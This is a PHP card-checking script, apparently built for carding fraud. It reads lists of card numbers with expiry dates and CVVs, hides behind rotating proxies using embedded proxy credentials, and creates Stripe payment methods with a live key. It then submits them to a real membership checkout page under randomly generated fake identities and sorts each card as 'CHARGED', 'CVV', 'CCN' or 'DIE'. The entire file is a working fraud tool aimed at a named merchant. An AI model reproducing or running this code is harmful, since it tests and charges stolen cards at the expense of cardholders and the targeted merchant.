
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://www.m2woman.com/membership-checkout/" ;
$amt = "accept" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
$username = $matches1[1][0];
preg_match_all("(\"gender\":\"(.*)\")siU", $get, $matches1);
$gender = $matches1[1][0];
preg_match_all("(\"title\":\"(.*)\")siU", $get, $matches1);
$title = $matches1[1][0];
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"name\":\"(.*)\")siU", $get, $matches1);
$fullname = $matches1[1][0];
preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
$password = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"country\":\"(.*)\")siU", $get, $matches1);
$country = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
/////////////===[Put Proxy User/Pass Here]/////////////
$rp1 = array(
  1 => 'swxvodeu:7bkre0a9c32e',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:80',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "🟢";
}
if (empty($ip1)){
$ip = "🔴";
}
# --------------------[Proxy End]-----------------#

# -------------------- [1 REQ] -------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.5,en-US,en;q=0.6,en-US,en;q=0.7,en-US,en;q=0.8,en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8ba2d099-3cdd-4b81-9b21-a556dfba8907cba420&muid=cb8a41f5-cb2b-4ddf-bfaa-912b258616c5676632&sid=8365468a-52cb-4113-a95f-ad6430f3d2db9db792&pasted_fields=number&payment_user_agent=stripe.js%2F20e004c1e5%3B+stripe-js-v3%2F20e004c1e5&time_on_page=41525&key=pk_live_KuBpmCzFNHpcRWxn6Bt7Bszo');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');
#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.m2woman.com/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.m2woman.com',
'method: POST',
'path: /membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-US,en;q=0.5,en-US,en;q=0.6,en-US,en;q=0.7,en-US,en;q=0.8,en-US,en;q=0.9',
'Connection: keep-alive',
'content-type: application/x-www-form-urlencoded',
'cookie: PHPSESSID=ae10e8c6048e7eb1fb30ab63ed58a236; pmpro_visit=1; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; _ga=GA1.2.133607277.1686482463; _gid=GA1.2.836869017.1686482463; __stripe_mid=cb8a41f5-cb2b-4ddf-bfaa-912b258616c5676632; __stripe_sid=8365468a-52cb-4113-a95f-ad6430f3d2db9db792; tk_lr=%22%22',
'origin: https://www.m2woman.com',
'referer: https://www.m2woman.com/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=4&checkjavascript=1&other_discount_code=&username='.$name.'ibadil&password=ibadil&password2=ibadil&bemail=ltash727%40gmail.com&bconfirmemail=ltash727%40gmail.com&fullname=&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX3588&ExpirationMonth=12&ExpirationYear=2027');



$result2 = curl_exec($ch);
# ----------------[2req End]------------------#

#----------------[Bin Info]----------------#
$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['name'];
$emoji = $fim['country']['emoji'];
$type = $fim['type'];
#----------------[Bin Info End]----------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:succeeded '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "insufficient funds.")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: INSUFFICIENT FUNDS </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
    exit;
    }

elseif(strpos($result2, "incorrect_zip")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: incorrect_zip </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: insufficient funds </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is invalid.')) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is invalid </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
    exit;
    }

    elseif(strpos($result2, "Error updating default payment method. Your card's security code is incorrect.")) {

        echo '💳CCN</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
        exit;
        }
    elseif(strpos($result2, "Your card's security code is incorrect")) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result:  transaction_not_allowed </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
    exit;
    }
    
elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D 🆘  </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ⛔ </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
}

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR 📛 </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';

}

elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT 🚫 </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ ❗ </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';

}

elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline 🛑 </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline 💀 </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span><br>☑️Result:cvc_check_pass </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result: Membership Confirmation '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "Thank for your support!")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank for your support '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank you for your donation '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Membership Confirm '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank You For Donation '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank You '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span><br>☑️Result:incorrect_cvc </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "invalid_cvc")) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span><br>☑️Result:invalid_cvc </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span><br>☑️Result:declined by your bank </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : BARUDAK JAWIR </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: not support this type of purchase 🆘 </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';

}

elseif(strpos($result2, "our card is not supported.")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED 🆘 </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';

}

else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>'.$ip.'Proxy:'.$ip1.'</span><br>';

}



curl_close($ch);
ob_flush();
#echo "</i><font size=2 color='grey'>proxy : $ip1</i></font><br>";
#echo $result1;
#echo $result2;

?>